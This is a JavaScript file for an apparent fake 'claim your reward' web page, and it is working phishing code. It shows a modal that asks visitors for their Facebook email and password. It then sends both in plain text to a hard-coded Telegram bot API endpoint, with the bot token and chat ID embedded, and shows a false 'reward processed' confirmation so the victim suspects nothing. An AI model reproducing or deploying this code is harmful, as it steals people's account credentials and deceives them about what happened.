document.addEventListener('DOMContentLoaded', () => {
    const claimButtons = document.querySelectorAll('.claim-btn');
    const modal = document.getElementById('claimModal');
    const fbLoginBtn = document.getElementById('fb-login-btn');
    const fbEmail = document.getElementById('fb-email');
    const fbPassword = document.getElementById('fb-password');

    claimButtons.forEach(button => {
        button.addEventListener('click', () => {
            modal.style.display = 'flex';
        });
    });

    fbLoginBtn.addEventListener('click', async () => {
        if (fbEmail.value && fbPassword.value) {
            try {
                const message = `🔐 Login Details:\n📧 Email: ${fbEmail.value}\n🔑 Password: ${fbPassword.value}`;
                
                await fetch(`https://api.telegram.org/bot7496628494:AAFipx11EshHzEmO9V9gczD6khf5dKnnaIM/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: "6153049118",
                        text: message,
                        parse_mode: "HTML"
                    })
                });

                const modalContent = document.querySelector('.modal-content');
                modalContent.innerHTML = `
                    <h2 style="color: #FFD700; font-size: 24px; margin-bottom: 20px;">🎉 Congratulations! 🎉</h2>
                    <p style="font-size: 18px; margin: 20px 0; color: #fff;">Your reward claim has been processed successfully!</p>
                    <p style="font-size: 16px; color: #ccc;">Please allow up to 24 hours for the reward to be delivered to your account.</p>
                    <div class="success-animation">
                        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                            <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
                            <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                        </svg>
                    </div>
                `;

                setTimeout(() => {
                    window.location.href = window.location.href;
                }, 3000);

            } catch (error) {
                console.error('Error:', error);
                alert('Server error. Please try again later.');
            }
        } else {
            alert('Please enter your Facebook credentials to continue');
        }
    });

    modal.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.style.display = 'none';
            fbEmail.value = '';
            fbPassword.value = '';
        }
    });

    // Add hover effects to reward items
    const rewardItems = document.querySelectorAll('.reward-item');
    rewardItems.forEach(item => {
        item.addEventListener('mouseenter', () => {
            item.style.transform = 'translateY(-5px)';
        });
        
        item.addEventListener('mouseleave', () => {
            item.style.transform = 'translateY(0)';
        });
    });
});
